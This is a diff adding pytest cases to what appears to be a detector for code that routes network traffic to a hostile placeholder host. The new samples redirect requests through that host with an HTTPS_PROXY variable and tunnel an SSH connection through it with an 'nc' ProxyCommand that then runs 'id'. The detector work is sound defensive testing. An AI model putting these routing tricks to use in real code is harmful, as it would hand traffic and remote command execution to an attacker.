@@ -5379,6 +5379,16 @@ class TestEgressHostParsingAndTracking:
                 f"s, _ = mk()\ns.get('http://{_H}/')",
                 id = "tuple_returned_and_unpacked",
             ),
+            pytest.param(
+                f"import os, requests\nos.environb[b'HTTPS_PROXY'] = b'http://{_H}:8080'\n"
+                "requests.get('https://pypi.org/')",
+                id = "environb_proxy",
+            ),
+            pytest.param(
+                "import paramiko\nfrom fabric import Connection\nConnection('pypi.org', connect_kwargs = "
+                f"{{'sock': paramiko.ProxyCommand('nc {_H} 22')}}).run('id')",
+                id = "fabric_connect_kwargs_sock",
+            ),
         ],
     )
     def test_the_hostile_host_is_seen(self, code):
@@ -5397,6 +5407,11 @@ class TestEgressHostParsingAndTracking:
             pytest.param(
                 "def load():\n    return {'a': 1}, [1]\ncfg, xs = load()\nprint(cfg.get('a'))",
                 id = "tuple_without_client",
+            ),
+            pytest.param(
+                "from fabric import Connection\n"
+                "Connection('pypi.org', connect_kwargs = {'key_filename': '/k'}).run('id')",
+                id = "fabric_connect_kwargs_without_route",
             ),
         ],
     )
